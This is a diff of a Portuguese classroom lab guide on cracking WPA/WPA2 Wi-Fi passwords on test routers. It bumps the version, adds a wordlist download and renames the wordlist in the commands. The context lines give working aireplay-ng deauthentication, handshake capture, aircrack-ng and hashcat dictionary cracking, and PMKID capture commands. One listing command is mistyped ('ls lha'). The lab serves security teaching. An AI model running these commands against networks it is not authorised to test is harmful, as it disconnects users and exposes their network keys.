@@ -9,18 +9,18 @@
 ## ℹ️ Informações do Documento
 
 | Campo | Descrição |
-|---|---|
+|-------|-----------|
 | **Autor** | Robson Vaamonde |
 | **Data de criação** | 22/07/2026 |
-| **Data de atualização** | 22/07/2026 |
-| **Versão** | 0.01 |
+| **Data de atualização** | 18/08/2026 |
+| **Versão** | 0.02 |
 | **Equipamentos testados** | Archer C50 (W) e Archer EC220-G5 |
 ---
 
 ### 🔗 Links do Autor
 
 | Canal | Link |
-|---|---|
+|-------|------|
 | Procedimentos em TI | http://procedimentosemti.com.br |
 | Bora para Prática | http://boraparapratica.com.br |
 | Site pessoal | http://vaamonde.com.br |
@@ -69,6 +69,7 @@
 ---
 
 > 💡 **Ponto-chave desta aula:** a cifra utilizada (AES puro ou AES+TKIP) **não altera o método de ataque**. O alvo do ataque não é a cifra dos dados, e sim a **chave pré-compartilhada**, revelada apenas por meio da captura do **4-way handshake** seguida de um ataque de **dicionário** — não existe atalho estatístico como no WEP. **Não há diferença metodológica entre atacar WPA e WPA2**: a técnica é idêntica para os dois protocolos.
+---
 
 > ⚠️ **Sem um bom dicionário, o `aircrack-ng` não tem como recuperar a chave**, mesmo capturando o handshake perfeitamente — reforce esse ponto com a turma antes de iniciar a prática. Utilize a wordlist do laboratório já preparada (`wordlist-laboratorio.txt` / `wordlist-laboratorio-expandida.txt`).
 ---
@@ -81,6 +82,13 @@ sudo iwconfig
 
 # Verificar detalhes da placa (fabricante/chipset)
 sudo lsusb
+
+# Download do Dicionário de Senhas Personalizadas para essa atividade
+wget https://raw.githubusercontent.com/vaamonde/kalilinux/refs/heads/main/05-wordlist/02-wordlist-lab-expandida.txt
+
+# Verificando se o Dicionário de Senhas foi baixado corretamente no Notebook
+# opções do comando ls: -l (long list format), -h (human readable), -a (all files)
+ls lha *.txt
 
 # Verificar o status de processos de gerenciamento da Rede Sem-Fio
 # opção do comando airmon-ng: check (List all possible programs that could interfere with the wireless card)
@@ -174,20 +182,22 @@ sudo aireplay-ng -0 5 -a <BSSID_DO_AP> -c <MAC_DO_CLIENTE_STATION> wlan1mon
 ```
 
 | Parâmetro | Descrição |
-|---|---|
+|-----------|-----------|
 | `-0 5` | Tipo de ataque **deauth**, enviando **5 pacotes** de desautenticação (ajustável; `-0 0` envia continuamente). |
 | `-a` | BSSID (MAC) do AP-alvo. |
 | `-c` | MAC do cliente (Station) a ser desautenticado, obtido no passo 03. |
 | `wlan1mon` | Interface em modo monitor usada para a injeção. |
 
 > ⚠️ **Sem cliente associado (STATION vazio)?** É necessário aguardar passivamente até que algum dispositivo se conecte naturalmente à rede — o modo passivo não exige capacidade de injeção, mas depende de um cliente se autenticar durante a captura.
+---
 
 > 💡 **Modo passivo (alternativa):** caso não queira interferir ativamente na rede, basta manter o `airodump-ng` do passo 04 rodando e aguardar a reconexão espontânea de algum dispositivo (ex.: um celular saindo do modo avião ou reconectando ao Wi-Fi).
+---
 
 ### ✅ Testes de Validação
 
 | # | Teste |
-|---|---|
+|---|-------|
 | 1 | O cliente-alvo perde e recupera a conexão com a rede durante o ataque. |
 | 2 | No terminal do `airodump-ng`, aparece a mensagem **`WPA handshake: <BSSID>`** no canto superior direito da tela. |
 ---
@@ -212,11 +222,11 @@ Com o handshake confirmado, aplica-se o ataque de força bruta por dicionário �
 ```bash
 # Forçando uma quebra de senha WAP do Access Point utilizando o arquivo de dicionário
 # opções do comando aircrack-ng: -b (MAC address of access point), -w (Path to a dictionary file for wpa cracking)
-sudo aircrack-ng -b <BSSID_DO_AP> -w wordlist-laboratorio-expandida.txt chavewpa-01.cap
+sudo aircrack-ng -b <BSSID_DO_AP> -w 02-wordlist-lab-expandida.txt chavewpa-01.cap
 ```
 
 | Parâmetro | Descrição |
-|---|---|
+|-----------|-----------|
 | `-b` | Filtra a análise para o BSSID do AP-alvo, caso o `.cap` tenha capturado mais de uma rede. |
 | `-w` | Caminho do arquivo de dicionário (wordlist) a ser testado contra o handshake. |
 | `chavewpa-01.cap` | Arquivo de captura gerado no passo 04. |
@@ -225,7 +235,7 @@ sudo aircrack-ng -b <BSSID_DO_AP> -w wordlist-laboratorio-expandida.txt chavewpa
 ### ✅ Resultado Esperado
 
 | Situação | Ação |
-|---|---|
+|----------|------|
 | ✅ `KEY FOUND! [ senha ]` | Senha PSK descoberta — anotar no relatório do grupo (junto com BSSID, ESSID e cifra AES/AES+TKIP). |
 | ❌ `Passphrase not in dictionary` | A senha não consta na wordlist utilizada — confirmar se a senha do grupo está entre as sorteadas ou revisar a wordlist expandida. |
 ---
@@ -242,11 +252,11 @@ Para dicionários maiores ou testes de desempenho comparado, o **hashcat** aprov
 sudo hcxpcapngtool -o chavewpa.22000 chavewpa-01.cap
 
 # Rodar o ataque de dicionário (modo 22000 = WPA-PBKDF2-PMKID+EAPOL)
-sudo hashcat -m 22000 chavewpa.22000 wordlist-laboratorio-expandida.txt
+sudo hashcat -m 22000 chavewpa.22000 02-wordlist-lab-expandida.txt
 ```
 
 | Parâmetro | Descrição |
-|---|---|
+|-----------|-----------|
 | `hcxpcapngtool` | Converte o `.cap` do `airodump-ng` para o formato `.22000` esperado pelo hashcat (ferramenta do pacote `hcxtools`). |
 | `-m 22000` | Modo de hash do hashcat correspondente a handshakes WPA/WPA2 (EAPOL) e PMKID. |
 ---
@@ -256,7 +266,7 @@ sudo hashcat -m 22000 chavewpa.22000 wordlist-laboratorio-expandida.txt
 ### ✅ Testes de Validação
 
 | # | Teste |
-|---|---|
+|---|-------|
 | 1 | Arquivo `.22000` gerado sem erros pelo `hcxpcapngtool`. |
 | 2 | `hashcat` retorna a senha em texto claro ao final da linha correspondente ao handshake (`Status: Cracked`). |
 ---
@@ -273,7 +283,7 @@ sudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1
 sudo hcxpcapngtool -o captura.22000 captura.pcapng
 
 # Atacar com hashcat (modo 22000 também cobre PMKID)
-sudo hashcat -m 22000 captura.22000 wordlist-laboratorio-expandida.txt
+sudo hashcat -m 22000 captura.22000 02-wordlist-lab-expandida.txt
 ```
 
 > 💡 **Quando usar:** este método é um complemento útil quando o AP não possui clientes ativos no momento do teste — nem todo AP é vulnerável a esse tipo de extração, então trate como uma alternativa, não substituto, do fluxo principal (passos 04-08).
@@ -284,7 +294,7 @@ sudo hashcat -m 22000 captura.22000 wordlist-laboratorio-expandida.txt
 ### ✅ Testes de Validação Final
 
 | # | Teste |
-|---|---|
+|---|-------|
 | 1 | Conectar um dispositivo à rede do grupo usando a senha encontrada, confirmando o acesso. |
 | 2 | Registrar no relatório: BSSID, ESSID, canal, protocolo (WPA ou WPA2), cifra (AES ou AES+TKIP), ferramenta utilizada (aircrack-ng ou hashcat), tempo total e senha descoberta. |
 | 3 | Comparar o tempo de quebra entre a cifra **AES pura** e o modo **AES+TKIP** — a expectativa é que **não haja diferença relevante**, já que o ataque mira a chave PSK, não a cifra dos dados. Discutir esse ponto em grupo. |
